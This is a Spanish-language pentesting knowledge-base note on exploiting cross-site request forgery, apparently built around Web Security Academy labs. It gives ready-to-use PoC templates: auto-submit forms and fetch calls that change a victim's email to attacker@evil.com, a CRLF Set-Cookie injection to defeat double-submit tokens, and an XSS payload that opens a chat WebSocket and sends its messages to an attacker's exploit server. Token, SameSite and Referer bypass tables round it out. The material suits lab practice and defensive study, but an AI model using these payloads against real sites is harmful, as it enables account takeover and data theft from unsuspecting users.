---
aliases:
  - CSRF
  - Cross-Site Request Forgery
  - cross-site-request-forgery
  - csrf-entrypoint
tags:
  - vuln/csrf
  - entrypoint
---

# CSRF (Cross-Site Request Forgery) — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **explotar** un CSRF*.
> **Dónde** aplica en el target (qué acción cambiar) → eso vive en los `STAGE_x` (recon del negocio).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 11 labs (Apprentice + Practitioner), orden oficial + foco de cada uno: [labs/README.md](labs/README.md)
- 🧰 **Burp** → *Engagement tools → Generate CSRF PoC* (Professional) genera el HTML auto-submit.
- 🔗 Cuando **hay token** y no lo bypasseás por CSRF → [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|XSS que lee el token]] o **dangling markup** bajo CSP.

## 🎯 Condiciones para que exista CSRF (la FLAG real)

CSRF requiere **las tres** a la vez:

1. **Acción relevante con estado** que valga la pena forjar → cambiar **email/password**, borrar cuenta, transferir, hacer admin… **Esta es la FLAG por defecto: que exista una acción relevante.** Sin acción que forjar, no hay CSRF útil.
2. **Manejo de sesión basado en cookies** — la request se autoriza **solo** con la cookie de sesión, que el navegador manda **sola** en peticiones cross-site.
3. **Parámetros predecibles** — no hay ningún valor que el atacante no pueda conocer/adivinar (si hay un token CSRF fuerte y bien atado, esto falla… salvo los bypasses de abajo).

> [!danger] 🚩 ¿Está o no está?
> La pregunta correcta **no** es "¿tiene token?" sino **"¿hay una acción relevante que forjar?"**. Si la hay → evaluá la defensa (token / SameSite / Referer) y buscá el punto flojo. La ausencia de token es el caso fácil; con token, casi siempre hay un bypass.

## 🧪 Cómo explotar (metodología)

1. **Identificá la acción relevante** (change-email/password, etc.) y capturá la request en Burp.
2. **Mirá la defensa:**
   - ¿Hay **token CSRF**? ¿en qué parámetro? ¿cambia por request? ¿está atado a *tu* sesión?
   - ¿La cookie tiene **`SameSite`**? (`Strict`/`Lax`/`None` o ausente).
   - ¿Valida **`Referer`/`Origin`**?
3. **Probá los puntos flojos** (tabla abajo) hasta que la request pase sin la interacción legítima.
4. **Armá el PoC** (form auto-submit / GET / `_method` / CRLF Set-Cookie) y **entregalo a la víctima** por el exploit server.
5. **Verificá impacto:** que la acción se ejecutó en la sesión de la víctima (email cambiado → reset de password).

## 🚚 Tipos de ataque (vectores de entrega)

> En todos, la <mark>URL dinámica</mark> resaltada es lo que reemplazás por el **target** de cada lab (o por tu **Collaborator** cuando el objetivo es *exfiltrar*, no ejecutar). Qué vector podés usar depende del **SameSite** de la cookie (ver más abajo).

**1) POST form (auto-submit)** — el clásico. Manda la cookie si `SameSite=None`. Sirve cuando la acción es un POST con body `x-www-form-urlencoded`:
<pre><code>&lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
  &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>

**2) IMG con GET** — una línea, sin JS. Sirve si el endpoint acepta **GET** (o con `_method`). También es el vector para **beacon de exfiltración** apuntando al Collaborator:
<pre><code>&lt;img src="https://<mark>TARGET</mark>/my-account/change-email?email=<mark>attacker@evil.com</mark>"&gt;
&lt;!-- exfil: &lt;img src="https://<mark>BURP-COLLABORATOR</mark>/?token="+... --&gt;</code></pre>

**3) fetch con `credentials: "include"`** — manda la cookie en un fetch cross-site. Control fino del método/body; ideal para **APIs REST** (ver flag abajo). No necesitás leer la respuesta (CORS la tapa), solo causar el efecto:
<pre><code>&lt;script&gt;
fetch("https://<mark>TARGET</mark>/my-account/change-email", {
  method: "POST",
  credentials: "include",                                  // ← manda la cookie
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=<mark>attacker@evil.com</mark>"
});
&lt;/script&gt;</code></pre>

> [!danger] 🚩 API REST que espera JSON → **NO es descarte**
> Que el endpoint sea una **API REST con `Content-Type: application/json`** **no** mata el CSRF. La clave es el **preflight CORS**:
> - Un fetch cross-site con `application/json` es un content-type **"no simple"** → dispara **preflight `OPTIONS`** → si el server no lo permite, se bloquea.
> - Pero los content-types **"simples"** (`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) **NO** disparan preflight → la request pasa.
> - **Probá convertir el body JSON a `x-www-form-urlencoded`** (o `text/plain` con el JSON crudo dentro). **Si el server igual parsea el body → el CSRF sigue vivo.** Un `<form>` HTML **solo** puede mandar esos tres content-types (nunca `application/json`), por eso la conversión es *la* técnica.

## 🔎 Puntos flojos a verificar (bypass de token)

> El token puede existir pero estar **mal implementado**. Probá en este orden:

<table>
<tr><th>Punto flojo</th><th>Cómo detectarlo</th><th>Bypass</th></tr>
<tr><td><b>Valida el token en POST pero NO en GET</b></td><td>Cambiá el método a GET (o buscá si el endpoint acepta GET)</td><td>Mandá la acción por <b>GET sin token</b> (o con <code>_method</code>). El validador solo corre en POST.</td></tr>
<tr><td><b>Valida el token solo si está presente</b></td><td>Sacá el parámetro <code>csrf</code> por completo (no lo dejes vacío: <b>eliminalo</b>)</td><td>Sin parámetro <code>csrf</code> → no hay nada que validar → pasa.</td></tr>
<tr><td><b>Token NO atado a la sesión</b></td><td>Logueate como atacante, copiá <b>tu</b> token válido, usalo en la request de la víctima</td><td>Reusás <b>tu propio token</b> (es válido "para cualquiera"). El server no chequea que sea de esa sesión.</td></tr>
<tr><td><b>Token atado a una cookie que NO es la de sesión</b> (dos frameworks: uno maneja sesión, otro CSRF)</td><td>El token se valida contra una cookie tipo <code>csrfKey</code> aparte de la de sesión</td><td>Buscá un endpoint que dispare <b>Set-Cookie</b> (p. ej. <code>search</code> con CRLF) para <b>setear tu <code>csrfKey</code></b> en la víctima + tu token que matchea. Ver PoC CRLF abajo.</td></tr>
<tr><td><b>Token duplicado en cookie y body (double-submit)</b></td><td>El server solo compara que <code>csrf</code> del <b>body</b> == <code>csrf</code> de la <b>cookie</b> (no valida el token de verdad)</td><td>Inyectá <code>Set-Cookie: csrf=<mark>fake</mark></code> (CRLF) y mandá <code>csrf=<mark>fake</mark></code> en el body → coinciden → pasa. Cualquier valor sirve mientras <b>header/cookie y body sean iguales</b>.</td></tr>
</table>

> [!tip] "Dos frameworks distintos"
> Cuando **la sesión** la maneja un componente y **el CSRF** otro, el token suele atarse a una **cookie propia** (`csrfKey`, `csrf`…) **no** ligada a tu login. Si podés **setear esa cookie** en el navegador de la víctima (vía CRLF/Set-Cookie o `Set-Cookie` reflejado), controlás el token y el bypass sale. Buscá **qué endpoint dispara `Set-Cookie`** y si podés inyectar contenido ahí.

## 🍪 Bypass de SameSite

La cookie moderna suele venir con `SameSite`. Cómo cae cada nivel:

<table>
<tr><th>SameSite</th><th>Qué bloquea</th><th>Bypass</th></tr>
<tr><td><code>None</code> / ausente</td><td>Nada (histórico)</td><td>CSRF clásico directo.</td></tr>
<tr><td><code>Lax</code> (default de Chrome)</td><td>POST cross-site; deja pasar <b>GET de navegación top-level</b></td><td><b>Method override:</b> GET con <code>_method=POST</code> (o <code>X-HTTP-Method-Override</code>). El framework lo trata como POST.</td></tr>
<tr><td><code>Strict</code></td><td>TODO lo cross-site</td><td>1) <b>Redirect del lado cliente</b>: un gadget same-site que redirige según un parámetro → la request final sale del propio sitio. 2) <b>Subdominio hermano</b>: XSS/WebSocket en <code>cms.</code>/hermano (mismo <i>site</i>) → las cookies Strict viajan entre hermanos.</td></tr>
</table>

> [!note] 🍪 SameSite **enruta el vector, NO descarta el CSRF**
> No hace falta `SameSite=None` sí o sí. Lo que cambia es **qué vector** de los de arriba te sirve:
> - **`None`/ausente** → andan **todos** (POST form, IMG, fetch).
> - **`Lax`** → los vectores subrecurso (POST form auto-submit, IMG, fetch) **no** llevan la cookie; **solo** una **navegación GET top-level** la lleva → usá `location=…&_method=POST`.
> - **`Strict`** → nada cross-site → necesitás **redirect client-side** o **subdominio hermano**.
> Es "descarte" **solo** para el PoC cross-site directo cuando es `Strict` y no hay gadget → ahí saltás a **XSS**. Pero como clase, CSRF casi nunca queda descartado por SameSite (labs 7-11).

## 🔗 Bypass de Referer

<table>
<tr><th>Defensa Referer</th><th>Bypass</th></tr>
<tr><td>Valida <b>solo si el Referer está presente</b></td><td>Suprimilo: <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> en el exploit.</td></tr>
<tr><td>Valida que el Referer <b>contenga</b> el dominio (substring)</td><td>Metelo en tu query string: <code>exploit.net/?<mark>target</mark>.web-security-academy.net</code> + <code>Referrer-Policy: unsafe-url</code> (o <code>history.pushState</code>).</td></tr>
</table>

## 🐍 PoCs (plantillas)

> En todos, lo <mark>resaltado</mark> es lo que reemplazás: la URL del target y tu email/valor. La URL del target conviene tenerla como **variable** (`url`) para reusar el snippet.

### 1) Form auto-submit (POST, sin defensa o con token bypasseado)

<pre><code>&lt;html&gt;&lt;body&gt;
  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
  &lt;/form&gt;
  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre>

### 2) GET con `_method=POST` (SameSite=Lax)

<pre><code>&lt;script&gt;
const url = "https://<mark>TARGET</mark>";
const email = Math.random().toString(36).slice(2) + "@example.com";
location = `${url}/my-account/change-email?email=${email}&_method=POST`;
&lt;/script&gt;</code></pre>

### 3) CRLF → Set-Cookie (token atado a cookie no-de-sesión / double-submit)

Setea la cookie de CSRF de la víctima con un valor tuyo, y después envía el form con el token que coincide:

<pre><code>&lt;script&gt;
const url  = "https://<mark>TARGET</mark>";
const csrf = "<mark>fake</mark>";           // el valor que vas a duplicar en cookie y body
const email = Math.random().toString(36).slice(2) + "@example.com";

// (a) endpoint que refleja en Set-Cookie vía CRLF → setea csrf/csrfKey en la víctima
new Image().src = `${url}/?search=x%0d%0aSet-Cookie:%20csrf=${csrf}%3b%20SameSite=None`;

// (b) form con el MISMO valor en el body → cookie == body → pasa
setTimeout(() =&gt; {
  const f = document.createElement("form");
  f.method = "POST";
  f.action = `${url}/my-account/change-email`;
  f.innerHTML = `&lt;input name=email value="${email}"&gt;&lt;input name=csrf value="${csrf}"&gt;`;
  document.body.appendChild(f);
  f.submit();
}, 1000);
&lt;/script&gt;</code></pre>

> `%0d` = CR · `%0a` = LF · `%0d%0a` = CRLF (lo que corta la cabecera para inyectar `Set-Cookie`).

### 4) Subdominio hermano (SameSite=Strict) — ejemplo real con WebSocket

Cuando la cookie es `Strict` pero hay **XSS en un subdominio hermano**, lanzás el ataque desde ahí (same-site). Ejemplo: inyectar por el login de un `cms.` un payload que abre el WebSocket de chat y exfiltra al exploit server:

<pre><code>&lt;script&gt;
const url = "https://<mark>cms-TARGET</mark>";          // subdominio hermano vulnerable a XSS
const attackerServer = "https://<mark>EXPLOIT</mark>/logs";

const script = `
&lt;audio src=x onerror="
  const ws = new WebSocket('wss://<mark>TARGET</mark>/chat');
  ws.onopen = () =&gt; ws.send('READY');
  ws.onmessage = (e) =&gt; fetch('${attackerServer}' + e.data);
"&gt;`;

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/login`;
form.innerHTML = `&lt;input name=username value='${script}'&gt;&lt;input name=password value='x'&gt;`;
document.body.appendChild(form);
form.submit();
&lt;/script&gt;</code></pre>

### 5) Burp CSRF PoC generator (Professional)

`Proxy`/`Repeater` → botón derecho sobre la request → **Engagement tools → Generate CSRF PoC** → copia el HTML al exploit server. Marcá *"Include auto-submit script"*.

---

> [!note] Relación con XSS
> Si hay **token bien implementado** (atado a sesión, no bypasseable) → el CSRF "puro" no alcanza. La salida es un **XSS** que **lea el token** de la página y forje la request en el mismo origen, o **dangling markup** para exfiltrar el token bajo CSP. Ambos en → [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|entry point de XSS]].
